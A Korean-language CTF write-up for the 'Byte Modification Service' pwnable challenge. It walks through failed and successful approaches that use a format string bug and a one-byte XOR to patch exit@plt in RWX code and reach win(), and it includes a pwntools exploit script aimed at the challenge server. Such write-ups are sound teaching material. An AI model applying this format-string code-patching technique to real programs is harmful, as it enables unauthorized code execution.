# [CyberSpace CTF 2024 / pwnable] Byte Modification Service

> Welcome to my Byte Modification Service, please modify the byte and leave your comments.
>
> [Attachment](./attachment)

## Analysis

![image](https://github.com/user-attachments/assets/af2cd404-b43c-458a-915d-dcbdbd838f00)

스택의 임의의 위치에 저장된 값을 `value`로 가져와서 \[1\], `value`에서 1바이트를 임의의 값과 xor 하여 조작할 수 있다 \[2\]. 이렇게 조작된 값과 format string bug를 이용하여 \[3\] `win()`을 호출하면 플래그를 획득할 수 있다.

## Exploitation

### First failed attempt - GOT overwrite

![image](https://github.com/user-attachments/assets/0cbd3ae6-c28d-44c8-bee2-4e23b47ba3b4)

FSB 이후에 `bye()`에서 `puts()`와 `exit()`을 차례로 호출한다. 이 두 함수 중 하나의 GOT를 `win()`으로 덮어쓰면 될 것 같지만, `puts()`는 `win()` 내부에서 플래그를 출력할 때 사용되기 때문에 덮으면 안 되고, `exit()`은 GOT 주소와 1바이트만 차이가 있는 값이 스택에 존재하지 않는다. Format string에 `exit()`의 GOT 주소를 포함시키는 방법은 주소에 `scanf()`의 terminator로 설정된 `'@'`(`0x40`)이 포함되기 때문에 불가능하다.

### Second failed attempt - Jump to win()

`main()`에서 `vuln()` 이전에 호출되는 `init()`을 보면,

![image](https://github.com/user-attachments/assets/b67774da-9a8a-4259-9120-1815fec23091)

`mprotect()` system call을 사용하여 코드 영역의 permission을 7(RWX)로 설정한다.

![image](https://github.com/user-attachments/assets/ea4de860-c6b6-42f7-b711-5fcb1b963928)

따라서 Runtime에 FSB를 이용하여 코드를 패치할 수 있다.

![image](https://github.com/user-attachments/assets/b50809f4-6a92-456b-ad33-59e327977725)

![image](https://github.com/user-attachments/assets/7877a51e-6edc-48bf-b03b-483461641e80)

스택에 있는 `_start()`의 주소를 가져와서 사용하면 `0x401100`부터 `0x4011ff` 사이의 주소에 write가 가능하다.

![image](https://github.com/user-attachments/assets/31239d6f-742f-4c83-a075-b5728d971edf)

이 영역에는 `exit()`의 PLT가 있기 때문에, 이 부분을 패치하여 `exit()`이 호출될 때 대신 임의의 코드가 실행되도록 할 수 있다.

Operand가 constant인 `jmp`의 경우,

![image](https://github.com/user-attachments/assets/d48d7696-7edf-4c4d-8713-efda67da6094)

`f2 e9` 뒤의 4바이트 값을 다음에 실행될 instruction의 주소에 더하면 destination이 된다.

`exit@plt`의 경우,

![image](https://github.com/user-attachments/assets/20b86388-4429-4b1f-9393-451412813f6d)

`0x401125`부터 4바이트를 `0x190e9`로 덮어쓰면 `win()`으로 점프하는 코드가 된다.

```python
from pwn import *

context(log_level="debug")

REMOTE = True

if REMOTE:
    r = remote("byte-modification-service.challs.csc.tf", 1337)
    pos = 0x2B
else:
    r = process("./attachment/chall")
    pos = 0x2D

sla = r.sendlineafter
sa = r.sendafter

idx = 0
xor_with = 0x401155 ^ 0x401125
payload = f"%{0x190e9 - 1}c%9$n".encode()

sla(b"which stack position do you want to use?\n", str(pos).encode())
sla(b"Byte Index?\n", str(idx).encode())
sla(b"xor with?\n", str(xor_with).encode())
sa(b"finally, do you have any feedback? it will surely help us improve our service.\n", payload.ljust(20, b"A"))
r.recvuntil(b"A")

r.interactive()
```

그런데 local에서는 플래그가 출력되지만,

![image](https://github.com/user-attachments/assets/e7607407-9c43-4cac-ad0c-96fb26a0a431)

Remote에서는 플래그가 출력되지 않아서 디버깅 로그를 출력해 보니,

![image](https://github.com/user-attachments/assets/0d9f9e7f-99e8-41b4-914c-be9d6b60960d)

`0xc000`바이트를 출력한 후에 연결이 끊겨버리는 것을 확인할 수 있었다.

### Third attempt - Just return exit@plt

![image](https://github.com/user-attachments/assets/538ecca9-422c-4b64-b0c8-aee6ef0b4288)

`bye()`의 마지막 instruction은 `exit@plt`를 호출하는 코드이기 때문에, `exit@plt`의 return address는 `bye()`의 바로 뒤쪽에 있는 `win()`의 주소가 된다. 정상적인 상황에서는 `exit()` 내부에서 프로세스가 종료되지만, `exit@plt`를 패치해서 `exit()`을 호출하지 않고 return하게 만들면 `win()`이 실행되어 플래그를 획득할 수 있다.

[ex.py](./ex.py)

![image](https://github.com/user-attachments/assets/2a52ac02-a0f1-4d41-af70-b16fc2912038)
